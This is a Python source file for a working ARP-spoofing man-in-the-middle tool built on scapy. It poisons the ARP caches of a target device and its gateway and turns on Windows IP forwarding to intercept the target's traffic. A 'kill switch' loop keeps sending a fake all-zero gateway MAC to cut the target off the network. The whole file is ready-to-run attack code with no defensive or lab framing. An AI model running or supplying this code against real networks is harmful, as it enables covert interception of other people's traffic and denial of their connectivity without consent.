"""
MITM Engine - ARP Spoofing with safety mechanisms
"""
import scapy.all as scapy
import time
import threading
import atexit
from core.platform_utils import PlatformUtils

class ARPSpoofer:
    """ARP Spoofing engine with automatic cleanup"""
    
    def __init__(self):
        """Initialize the ARP Spoofer"""
        self.is_spoofing = False
        self.kill_switch_active = False
        self.spoof_thread = None
        self.target_ip = None
        self.gateway_ip = None
        self.target_mac = None
        self.gateway_mac = None
        
        # Register emergency cleanup
        atexit.register(self.emergency_restore)
    
    def get_mac(self, ip):
        """
        Get MAC address for a given IP using ARP
        
        Args:
            ip (str): Target IP address
            
        Returns:
            str: MAC address or None if not found
        """
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            if answered_list:
                return answered_list[0][1].hwsrc
            return None
        except Exception as e:
            print(f"[!] Error getting MAC for {ip}: {e}")
            return None
    
    def spoof(self, target_ip, spoof_ip, target_mac):
        """
        Send a spoofed ARP packet
        
        Args:
            target_ip (str): IP of the target device
            spoof_ip (str): IP to impersonate (usually gateway)
            target_mac (str): MAC address of target
        """
        # Create Ethernet frame with destination MAC
        ether = scapy.Ether(dst=target_mac)
        # Create ARP reply (op=2)
        arp = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        # Combine layers
        packet = ether / arp
        scapy.sendp(packet, verbose=False)
    
    def restore(self, target_ip, gateway_ip, target_mac, gateway_mac):
        """
        Restore the ARP tables to their original state
        
        Args:
            target_ip (str): Target device IP
            gateway_ip (str): Gateway IP
            target_mac (str): Target device MAC
            gateway_mac (str): Gateway MAC
        """
        # Send correct ARP information with Ethernet layer
        ether = scapy.Ether(dst=target_mac)
        arp = scapy.ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=gateway_ip,
            hwsrc=gateway_mac
        )
        packet = ether / arp
        scapy.sendp(packet, count=4, verbose=False)
    
    
    def _spoof_loop(self):
        """
        Internal loop for continuous ARP spoofing
        Windows kernel handles packet forwarding - we just poison ARP tables
        """
        print(f"[*] Starting ARP spoofing: {self.target_ip} <-> {self.gateway_ip}")
        
        while self.is_spoofing:
            # Spoof target (tell target we are the gateway)
            self.spoof(self.target_ip, self.gateway_ip, self.target_mac)
            # Spoof gateway (tell gateway we are the target)
            self.spoof(self.gateway_ip, self.target_ip, self.gateway_mac)
            time.sleep(2)  # Send spoofed packets every 2 seconds
    
    def start_spoofing(self, target_ip, gateway_ip):
        """
        Start ARP spoofing attack
        Windows kernel handles packet forwarding - we only poison ARP tables
        
        Args:
            target_ip (str): Target device IP
            gateway_ip (str): Gateway/Router IP
            
        Returns:
            bool: True if started successfully
        """
        if self.is_spoofing:
            print("[!] Spoofing already active")
            return False
        
        # Get MAC addresses
        print(f"[*] Resolving MAC addresses...")
        self.target_mac = self.get_mac(target_ip)
        self.gateway_mac = self.get_mac(gateway_ip)
        
        if not self.target_mac or not self.gateway_mac:
            print("[!] Failed to resolve MAC addresses")
            return False
        
        print(f"[✓] Target MAC: {self.target_mac}")
        print(f"[✓] Gateway MAC: {self.gateway_mac}")
        
        # Store IPs for cleanup
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.kill_switch_active = False
        
        # CRITICAL: Enable Windows kernel forwarding FIRST
        print("[*] Enabling Windows kernel IP forwarding...")
        if not PlatformUtils.enable_ip_forwarding():
            print("[!] Failed to enable IP forwarding - MITM may not work")
            return False
        
        # Start ARP spoofing in background thread
        # Windows will handle the actual packet routing
        self.is_spoofing = True
        self.spoof_thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self.spoof_thread.start()
        
        print("[✓] ARP spoofing active")
        print("[✓] Windows kernel forwarding packets (native speed)")
        print("[*] Target internet should work normally")
        return True
    
    
    def stop_spoofing(self):
        """Stop ARP spoofing and restore ARP tables"""
        if not self.is_spoofing:
            return
        
        print("[*] Stopping ARP spoofing...")
        
        # Disable kill switch first (remove firewall rules)
        if self.kill_switch_active:
            self.disable_kill_switch()
        
        self.is_spoofing = False
        
        # Wait for ARP spoofing thread to finish
        if self.spoof_thread:
            self.spoof_thread.join(timeout=3)
        
        # Restore ARP tables
        if self.target_ip and self.gateway_ip and self.target_mac and self.gateway_mac:
            print("[*] Restoring ARP tables...")
            self.restore(self.target_ip, self.gateway_ip, self.target_mac, self.gateway_mac)
            self.restore(self.gateway_ip, self.target_ip, self.gateway_mac, self.target_mac)
        
        # Disable IP forwarding
        PlatformUtils.disable_ip_forwarding()
        
        print("[✓] ARP spoofing stopped")
    
    def _kill_switch_loop(self):
        """
        Continuous ARP denial loop - keeps poisoning target's ARP table
        Runs while kill switch is active
        """
        print(f"[*] Kill switch loop started for {self.target_ip}")
        fake_mac = "00:00:00:00:00:00"
        
        while self.kill_switch_active and self.is_spoofing:
            try:
                # Continuously tell target: "Gateway is at 00:00:00:00:00:00"
                # This ensures even cached connections die
                arp_response = scapy.ARP(
                    op=2,
                    pdst=self.target_ip,
                    hwdst=self.target_mac,
                    psrc=self.gateway_ip,
                    hwsrc=fake_mac
                )
                scapy.send(arp_response, verbose=False)
                time.sleep(0.2)  # Poison every 0.2 seconds (more aggressive)
            except:
                break
        
        print(f"[*] Kill switch loop stopped for {self.target_ip}")
    
    def enable_kill_switch(self):
        """
        Enable kill switch - continuously poison target's ARP with fake gateway MAC
        Target will send packets to nowhere, breaking internet
        """
        if not self.is_spoofing:
            print("[!] MITM not active - cannot enable kill switch")
            return False
        
        if not self.target_ip or not self.gateway_ip:
            print("[!] No target/gateway IP set")
            return False
        
        if self.kill_switch_active:
            print("[!] Kill switch already active")
            return False
        
        print(f"[*] Enabling kill switch - continuous ARP denial for {self.target_ip}")
        self.kill_switch_active = True
        
        # Start continuous ARP denial in background thread
        kill_thread = threading.Thread(target=self._kill_switch_loop, daemon=True)
        kill_thread.start()
        
        print(f"[✓] Kill switch enabled - {self.target_ip} internet blocked (continuous denial)")
        return True
    
    def disable_kill_switch(self):
        """
        Disable kill switch - restore correct gateway MAC to target
        """
        if not self.is_spoofing:
            print("[!] MITM not active")
            return False
        
        if not self.target_ip or not self.gateway_ip:
            print("[!] No target/gateway IP set")
            return False
        
        if not self.kill_switch_active:
            print("[!] Kill switch not active")
            return False
        
        print(f"[*] Disabling kill switch - restoring {self.target_ip} ARP table")
        self.kill_switch_active = False
        
        # Wait a moment for kill switch loop to stop
        time.sleep(1)
        
        try:
            # Restore MITM: Tell target gateway is at OUR MAC (resume MITM)
            # Send multiple times to overwrite the fake MAC
            for _ in range(10):
                arp_response = scapy.ARP(
                    op=2,
                    pdst=self.target_ip,
                    hwdst=self.target_mac,
                    psrc=self.gateway_ip,
                    hwsrc=scapy.get_if_hwaddr(scapy.conf.iface)
                )
                scapy.send(arp_response, verbose=False)
                time.sleep(0.1)
            
            print(f"[✓] Kill switch disabled - {self.target_ip} internet restored (MITM active)")
            return True
            
        except Exception as e:
            print(f"[!] Failed to disable kill switch: {e}")
            return False
    
    def emergency_restore(self):
        """Emergency cleanup called by atexit"""
        if self.is_spoofing:
            print("\n[!] Emergency ARP restoration triggered")
            # Clean up firewall rules if kill switch was active
            if self.kill_switch_active:
                self.disable_kill_switch()
            self.stop_spoofing()

